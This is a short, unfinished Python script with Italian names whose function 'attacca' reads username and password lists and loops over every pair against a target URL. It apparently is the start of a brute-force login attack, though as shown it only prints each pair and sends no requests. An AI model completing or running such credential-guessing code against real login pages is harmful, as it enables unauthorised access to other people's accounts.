import requests

def attacca(url, redirect):

    lista_utenti = open("usernames.txt")
    lista_password = open("passwords.txt")

    lista_utenti = lista_utenti.readlines()
    lista_password = lista_password.readlines()

    stop = False
    for user in lista_utenti:
        user =  user.rstrip()
        if(stop): break
        for pwd in lista_password:
            pwd = pwd.rstrip()
            if(stop): break
            print(f"{user} - {pwd}")